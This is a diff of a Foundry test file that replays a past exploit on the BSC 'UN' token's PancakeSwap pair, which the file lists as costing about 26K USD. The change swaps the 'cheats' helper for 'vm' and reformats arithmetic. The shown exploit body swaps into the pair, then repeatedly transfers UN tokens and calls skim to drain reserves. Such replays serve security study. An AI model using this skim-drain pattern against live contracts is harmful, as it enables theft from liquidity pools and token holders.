@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~26K USD$
 // Attacker - https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366
@@ -19,15 +18,13 @@ contract ContractTest is Test {
     IERC20 UN = IERC20(0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F);
     IUniswapV2Pair Pair = IUniswapV2Pair(0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1);
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_864_173);
-        cheats.label(address(DPPOracle), "DPPOracle");
-        cheats.label(address(BUSD), "BUSD");
-        cheats.label(address(UN), "UN");
-        cheats.label(address(this), "AttackerContract");
-        cheats.label(address(Pair), "Pair");
+        vm.createSelectFork("bsc", 28_864_173);
+        vm.label(address(DPPOracle), "DPPOracle");
+        vm.label(address(BUSD), "BUSD");
+        vm.label(address(UN), "UN");
+        vm.label(address(this), "AttackerContract");
+        vm.label(address(Pair), "Pair");
     }
 
     function testExploit() public {
@@ -50,11 +47,11 @@ contract ContractTest is Test {
         BUSD.transfer(address(Pair), amountIn);
         Pair.swap(amountOut, 0, address(this), new bytes(0));
 
-        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 93 / 100);
+        UN.transfer(address(Pair), (UN.balanceOf(address(this)) * 93) / 100);
         Pair.skim(address(this));
-        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 90 / 100);
+        UN.transfer(address(Pair), (UN.balanceOf(address(this)) * 90) / 100);
         Pair.skim(address(this));
-        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 80 / 100);
+        UN.transfer(address(Pair), (UN.balanceOf(address(this)) * 80) / 100);
         Pair.skim(address(this));
 
         (UNReserve, USDReserve,) = Pair.getReserves();
